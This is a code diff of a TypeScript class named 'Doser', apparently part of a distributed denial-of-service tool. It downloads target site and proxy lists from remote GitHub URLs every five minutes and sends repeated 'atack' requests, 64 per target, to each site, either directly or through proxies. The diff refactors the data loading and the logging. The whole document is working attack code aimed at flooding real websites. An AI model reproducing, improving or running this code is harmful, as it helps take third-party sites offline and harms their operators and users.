@@ -1,5 +1,6 @@
 import axios, { AxiosError } from 'axios-https-proxy-fix'
 import { EventEmitter } from 'events'
+// import {date} from "quasar";
 
 interface ProxyData {
   auth: string
@@ -10,10 +11,8 @@ interface ProxyData {
 interface SiteData {
   atack: number
   id: number
-  // eslint-disable-next-line camelcase
   need_parse_url: number
   page: string
-  // eslint-disable-next-line camelcase
   page_time: number
   url: string
 }
@@ -31,6 +30,10 @@ export class Doser {
   private working: boolean
   private workers: number
   private eventSource: EventEmitter
+  private ATACKS_PER_TARGET = 64;
+
+  private loadedTargetsAndProxies: any | null;
+  private loadingDataInterval;
 
   private workerActive: Array<boolean>
 
@@ -40,27 +43,35 @@ export class Doser {
     this.workers = workers
     this.eventSource = new EventEmitter()
     this.workerActive = new Array<boolean>(256)
-    this.workerActive.fill(false)
+    this.workerActive.fill(false);
+
+    //Initialize data
+    this.updateTargetsAndProxies();
+
+    // Update data repeatedly
+    this.loadingDataInterval = setInterval(() => {
+      this.updateTargetsAndProxies();
+    }, 300000)
+  }
+
+  private updateTargetsAndProxies() {
+    this.getSitesAndProxyes()
+      .then(data => {
+        this.loadedTargetsAndProxies = data
+      })
+      .catch(() => console.log('Unable to update data'))
   }
 
   forceProxy (newVal: boolean) {
     this.onlyProxy = newVal
   }
 
-  async loadHostsFile () {
-    // const response = await axios.get('http://rockstarbloggers.ru/hosts.json')
-    // this.hosts = response.data as Array<string>
-  }
-
   async getSitesAndProxyes () {
-    while (this.working) { // escaping unavailable hosts
-      try {
-        const sitesResponse = await axios.get('https://raw.githubusercontent.com/opengs/uashieldtargets/master/sites.json', { timeout: 10000 })
-        const proxyResponse = await axios.get('https://raw.githubusercontent.com/opengs/uashieldtargets/master/proxy.json', { timeout: 10000 })
+    try {
+      const sitesResponse = await axios.get('https://raw.githubusercontent.com/opengs/uashieldtargets/master/sites.json', { timeout: 10000 })
+      const proxyResponse = await axios.get('https://raw.githubusercontent.com/opengs/uashieldtargets/master/proxy.json', { timeout: 10000 })
 
-        if (sitesResponse.status !== 200) continue
-        if (proxyResponse.status !== 200) continue
-
+      if (sitesResponse.status === 200 && proxyResponse.status === 200) {
         const sites = sitesResponse.data as Array<SiteData>
         const proxyes = proxyResponse.data as Array<ProxyData>
 
@@ -68,34 +79,10 @@ export class Doser {
           sites,
           proxyes
         }
-      } catch (e) {
-        console.log('Error while loading hosts')
-        console.log(e)
       }
-    }
-    return null
-  }
-
-  async getRandomTarget () {
-    while (this.working) { // escaping unavailable hosts
-      try {
-        const sitesResponse = await axios.get('https://raw.githubusercontent.com/opengs/uashieldtargets/master/sites.json', { timeout: 10000 })
-        const proxyResponse = await axios.get('https://raw.githubusercontent.com/opengs/uashieldtargets/master/proxy.json', { timeout: 10000 })
-
-        if (sitesResponse.status !== 200) continue
-        if (proxyResponse.status !== 200) continue
-
-        const sites = sitesResponse.data as Array<SiteData>
-        const proxyes = proxyResponse.data as Array<ProxyData>
-
-        return {
-          site: sites[Math.floor(Math.random() * sites.length)],
-          proxy: proxyes
-        } as TargetData
-      } catch (e) {
-        console.log('Error while loading hosts')
-        console.log(e)
-      }
+    } catch (e) {
+      console.log('Error while loading hosts')
+      return null
     }
     return null
   }
@@ -126,16 +113,10 @@ export class Doser {
 
   private async worker (workerIndex: number) {
     let config = await this.getSitesAndProxyes()
-    let configTimestamp = new Date()
     while (this.working) {
       if (!this.workerActive[workerIndex]) {
         await new Promise(resolve => setTimeout(resolve, 10000))
         continue
-      }
-
-      if ((new Date()).getTime() - configTimestamp.getTime() > 300000) {
-        config = await this.getSitesAndProxyes()
-        configTimestamp = new Date()
       }
 
       if (config == null) {
@@ -159,10 +140,8 @@ export class Doser {
         }
       }
 
-      const ATACKS_PER_TARGET = 64
-
       let proxy = null
-      for (let atackIndex = 0; (atackIndex < ATACKS_PER_TARGET) && this.working; atackIndex++) {
+      for (let atackIndex = 0; (atackIndex < this.ATACKS_PER_TARGET) && this.working; atackIndex++) {
         try {
           if (directRequest) {
             const r = await axios.get(target.site.page, { timeout: 5000, validateStatus: () => true })
@@ -194,16 +173,16 @@ export class Doser {
             this.eventSource.emit('atack', { type: 'atack', url: target.site.page, log: `${target.site.page} | PROXY | ${r.status}` })
 
             if (r.status === 407) {
-              console.log(proxy)
+              console.log('Proxy requires auth: ', proxy)
               proxy = null
             }
           }
         } catch (e) {
-          console.log(e)
+          console.log('Request error')
           proxy = null
           let code = (e as AxiosError).code
           if (code === undefined) {
-            console.log(e)
+            console.log('Unknown error: ', e)
             code = 'UNKNOWN'
           }
           this.eventSource.emit('atack', { type: 'atack', url: target.site.page, log: `${target.site.page} | ${code}` })
